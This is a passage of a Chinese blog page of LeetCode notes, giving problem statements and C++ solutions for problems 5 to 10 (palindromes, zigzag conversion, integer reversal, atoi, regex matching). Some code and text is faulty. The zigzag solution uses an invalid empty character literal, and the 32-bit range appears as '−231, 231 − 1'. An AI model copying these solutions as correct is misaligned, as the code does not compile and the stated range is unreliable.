class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (s.empty())<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line"><span class="keyword">int</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;s.size(); i++) &#123;</span><br><span class="line"><span class="keyword">int</span> len1 = expandAroundCenter(s, i, i);</span><br><span class="line"><span class="keyword">int</span> len2 = expandAroundCenter(s, i, i+<span class="number">1</span>);</span><br><span class="line">len = max(len1, len2);</span><br><span class="line"><span class="keyword">if</span> (len &gt; end - start) &#123;</span><br><span class="line">start = i - (len<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">end = i + len/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> s.substr(start, end-start+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">expandAroundCenter</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> L = left, R = right;</span><br><span class="line"><span class="keyword">while</span> (L &gt;= <span class="number">0</span> &amp;&amp; R &lt; s.size() &amp;&amp; s[L] == s[R]) &#123;</span><br><span class="line">L --; </span><br><span class="line">R ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> R-L<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="6 Z字形变换"><a class="header-anchor" href="#6 Z字形变换" aria-hidden="true">¶</a> 6 Z字形变换</h2><ul><li>题目</li></ul><blockquote><p>将字符串 <code>&quot;PAYPALISHIRING&quot;</code> 以Z字形排列成给定的行数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; P   A   H   N</span><br><span class="line">&gt; A P L S I I G</span><br><span class="line">&gt; Y   I   R</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>之后从左往右，逐行读取字符：<code>&quot;PAHNAPLSIIGYIR&quot;</code></p><p>实现一个将字符串进行指定行数变换的函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; string convert(string s, int numRows);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: s = &quot;PAYPALISHIRING&quot;, numRows = 3</span><br><span class="line">&gt; 输出: &quot;PAHNAPLSIIGYIR&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: s = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">&gt; 输出: &quot;PINALSIGYAHRPI&quot;</span><br><span class="line">&gt; 解释:</span><br><span class="line">&gt; </span><br><span class="line">&gt; P     I    N</span><br><span class="line">&gt; A   L S  I G</span><br><span class="line">&gt; Y A   H R</span><br><span class="line">&gt; P     I</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>找规律</p><p>第一种情况，一行，原序</p><p>第二种情况，两行，交叉排序</p><p>第三种情况，三行以上，可以发现</p><p>总列数numColumns为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⌈</mo><mi>l</mi><mi>e</mi><mi>n</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo>⌉</mo></mrow><annotation encoding="application/x-tex">\lceil len/2\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:.75em"></span><span class="strut bottom" style="height:1em;vertical-align:-.25em"></span><span class="base textstyle uncramped"><span class="mopen">⌈</span><span class="mord mathit" style="margin-right:.01968em">l</span><span class="mord mathit">e</span><span class="mord mathit">n</span><span class="mord mathrm">/</span><span class="mord mathrm">2</span><span class="mclose">⌉</span></span></span></span></p><p>一列排满之后有numRows-2列只有单个字母，一共有 $$\lceil {len/(2numRows-2)} \rceil$$组</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">convert</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (numRows == <span class="number">1</span>)<span class="keyword">return</span> s;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> len = s.size();</span><br><span class="line">    <span class="keyword">if</span> (numRows == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">string</span> s1, s2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)s1 += s[i];</span><br><span class="line"><span class="keyword">else</span> s2 += s[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s1+s2;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">string</span> res;</span><br><span class="line">        <span class="keyword">int</span> numColumns = <span class="built_in">ceil</span>(len*<span class="number">1.0</span>/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">char</span> z[numRows][numColumns];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a=<span class="number">0</span>; a&lt;numRows; a++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b=<span class="number">0</span>; b&lt;numColumns; b++) &#123;</span><br><span class="line">z[a][b] = '';</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="built_in">ceil</span>(len*<span class="number">1.0</span>/(<span class="number">2</span>*numRows<span class="number">-2</span>));</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; len &amp;&amp; cnt --) &#123;</span><br><span class="line">        <span class="keyword">int</span> r = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;numRows &amp;&amp; i&lt;len; i++, j++) &#123;</span><br><span class="line">z[++r][c] = s[i];</span><br><span class="line">&#125;</span><br><span class="line">c ++;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;numRows<span class="number">-2</span> &amp;&amp; i&lt;len; i++, k++, c++) &#123;</span><br><span class="line">z[--r][c] = s[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a=<span class="number">0</span>; a&lt;numRows; a++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b=<span class="number">0</span>; b&lt;numColumns; b++) &#123;</span><br><span class="line">if (z[a][b] != '')res += z[a][b];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="7 反转整数"><a class="header-anchor" href="#7 反转整数" aria-hidden="true">¶</a> 7 反转整数</h2><ul><li>题目</li></ul><blockquote><p>给定一个 32 位有符号整数，将整数中的数字进行反转。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 123</span><br><span class="line">&gt; 输出: 321</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: -123</span><br><span class="line">&gt; 输出: -321</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 120</span><br><span class="line">&gt; 输出: 21</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>负数 false</p><p>正数 反向</p><p>最后判断 是否在INT范围</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        flag = <span class="number">-1</span>;</span><br><span class="line">        x = -x;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">long</span> y = x%<span class="number">10</span>;</span><br><span class="line">        x /= <span class="number">10</span>; </span><br><span class="line">        <span class="keyword">while</span> (x) &#123;</span><br><span class="line">        y *= <span class="number">10</span>;</span><br><span class="line">y += x%<span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>; </span><br><span class="line">&#125;</span><br><span class="line">y *= flag;</span><br><span class="line"><span class="keyword">if</span> (y&lt;INT_MIN|| y&gt;INT_MAX)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8 字符串转整数 (atoi)"><a class="header-anchor" href="#8 字符串转整数 (atoi)" aria-hidden="true">¶</a> 8 字符串转整数 (atoi)</h2><ul><li>题目</li></ul><blockquote><p>实现 <code>atoi</code>，将字符串转为整数。</p><p>该函数首先根据需要丢弃任意多的空格字符，直到找到第一个非空格字符为止。如果第一个非空字符是正号或负号，选取该符号，并将其与后面尽可能多的连续的数字组合起来，这部分字符即为整数的值。如果第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。</p><p>字符串可以在形成整数的字符后面包括多余的字符，这些字符可以被忽略，它们对于函数没有影响。</p><p>当字符串中的第一个非空字符序列不是个有效的整数；或字符串为空；或字符串仅包含空白字符时，则不进行转换。</p><p>若函数不能执行有效的转换，返回 0。</p><p><strong>说明：</strong></p><p>假设我们的环境只能存储 32 位有符号整数，其数值范围是 [−231, 231 − 1]。如果数值超过可表示的范围，则返回 INT_MAX (231 − 1) 或 INT_MIN (−231) 。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;42&quot;</span><br><span class="line">&gt; 输出: 42</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;   -42&quot;</span><br><span class="line">&gt; 输出: -42</span><br><span class="line">&gt; 解释: 第一个非空白字符为 &apos;-&apos;, 它是一个负号。</span><br><span class="line">&gt;      我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;4193 with words&quot;</span><br><span class="line">&gt; 输出: 4193</span><br><span class="line">&gt; 解释: 转换截止于数字 &apos;3&apos; ，因为它的下一个字符不为数字。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;words and 987&quot;</span><br><span class="line">&gt; 输出: 0</span><br><span class="line">&gt; 解释: 第一个非空字符是 &apos;w&apos;, 但它不是数字或正、负号。</span><br><span class="line">&gt;      因此无法执行有效的转换。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 5:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: &quot;-91283472332&quot;</span><br><span class="line">&gt; 输出: -2147483648</span><br><span class="line">&gt; 解释: 数字 &quot;-91283472332&quot; 超过 32 位有符号整数范围。 </span><br><span class="line">&gt;      因此返回 INT_MIN (−231) 。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>第一步，去除多余空格</p><p>第二步，判断结果为0的几种情况：首字符不是数字也不是<code>+/-</code>；首字符与相邻字符都部位数字</p><p>第三步，记录<code>+/-</code>符号，找到连续数字字符串</p><p>ps：上题判断int越界，long long可以搞定，这题给了一个更大的数，可以通过判断数字字符串的大小解决，注意前面连续多个<code>0</code>情况的干扰</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> res;</span><br><span class="line">    <span class="keyword">char</span> tag = <span class="string">'+'</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;str.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">' '</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!isNum(str[i]) &amp;&amp; str[i] != <span class="string">'+'</span> &amp;&amp; str[i] != <span class="string">'-'</span> </span><br><span class="line">|| (i &lt;str.size()<span class="number">-1</span> &amp;&amp; !isNum(str[i]) &amp;&amp; !isNum(str[i+<span class="number">1</span>])))<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">'-'</span> || str[i] == <span class="string">'+'</span>) tag = str[i];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; str.size() &amp;&amp; isNum(str[i])) &#123;</span><br><span class="line">res += str[i++];</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str2int(res, tag);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:    </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isNum</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (c &gt;= <span class="string">'0'</span> &amp;&amp; c &lt;= <span class="string">'9'</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">str2int</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">char</span> tag)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (s[i] == <span class="string">'0'</span>)i ++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len = s.size();</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (len-i &gt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (tag == <span class="string">'-'</span>)<span class="keyword">return</span> INT_MIN;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (tag == <span class="string">'+'</span>)<span class="keyword">return</span> INT_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (; i&lt;len; i++) &#123;</span><br><span class="line">res *= <span class="number">10</span>;</span><br><span class="line">res += (s[i]-<span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (res &gt; INT_MAX) &#123;</span><br><span class="line"><span class="keyword">if</span> (tag == <span class="string">'-'</span>)<span class="keyword">return</span> INT_MIN;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (tag == <span class="string">'+'</span>)<span class="keyword">return</span> INT_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (tag == <span class="string">'-'</span>)<span class="keyword">return</span> <span class="number">-1</span>*res;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (tag == <span class="string">'+'</span>)<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="9 回文数"><a class="header-anchor" href="#9 回文数" aria-hidden="true">¶</a> 9 回文数</h2><ul><li>题目</li></ul><blockquote><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 121</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: -121</span><br><span class="line">&gt; 输出: false</span><br><span class="line">&gt; 解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入: 10</span><br><span class="line">&gt; 输出: false</span><br><span class="line">&gt; 解释: 从右向左读, 为 01 。因此它不是一个回文数。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><ul><li>解题</li></ul><blockquote><p>与第7题类似</p><p>负数 false</p><p>正数 转化为字符串，判断</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">string</span> str = int2str(x);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"str "</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> len = str.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] != str[len-i<span class="number">-1</span>])<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">int2str</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="built_in">string</span> str;</span><br><span class="line"><span class="keyword">if</span> (x &lt; <span class="number">0</span>)  str += <span class="string">'-'</span>;</span><br><span class="line"><span class="keyword">int</span> y = <span class="built_in">abs</span>(x);</span><br><span class="line"><span class="keyword">while</span> (y) &#123;</span><br><span class="line">str += (y%<span class="number">10</span> +<span class="string">'0'</span>);</span><br><span class="line">y /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="10 正则表达式匹配"><a class="header-anchor" href="#10 正则表达式匹配" aria-hidden="true">¶</a> 10 正则表达式匹配</h2><ul><li>题目</li></ul><blockquote><p>给定一个字符串 (<code>s</code>) 和一个字符模式 (<code>p</code>)。实现支持 <code>'.'</code> 和 <code>'*'</code> 的正则表达式匹配。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; &apos;.&apos; 匹配任意单个字符。</span><br><span class="line">&gt; &apos;*&apos; 匹配零个或多个前面的元素。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>匹配应该覆盖<strong>整个</strong>字符串 (<code>s</code>) ，而不是部分字符串。</p><p><strong>说明:</strong></p><ul><li><code>s</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母。</li><li><code>p</code> 可能为空，且只包含从 <code>a-z</code> 的小写字母，以及字符 <code>.</code> 和 <code>*</code>。</li></ul><p><strong>示例 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入:</span><br><span class="line">&gt; s = &quot;aa&quot;</span><br><span class="line">&gt; p = &quot;a&quot;</span><br><span class="line">&gt; 输出: false</span><br><span class="line">&gt; 解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入:</span><br><span class="line">&gt; s = &quot;aa&quot;</span><br><span class="line">&gt; p = &quot;a*&quot;</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt; 解释: &apos;*&apos; 代表可匹配零个或多个前面的元素, 即可以匹配 &apos;a&apos; 。因此, 重复 &apos;a&apos; 一次, 字符串可变为 &quot;aa&quot;。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入:</span><br><span class="line">&gt; s = &quot;ab&quot;</span><br><span class="line">&gt; p = &quot;.*&quot;</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt; 解释: &quot;.*&quot; 表示可匹配零个或多个(&apos;*&apos;)任意字符(&apos;.&apos;)。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><strong>示例 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入:</span><br><span class="line">&gt; s = &quot;aab&quot;</span><br><span class="line">&gt; p = &quot;c*a*b&quot;</span><br><span class="line">&gt; 输出: true</span><br><span class="line">&gt; 解释: &apos;c&apos; 可以不被重复, &apos;a&apos; 可以被重复一次。因此可以匹配字符串 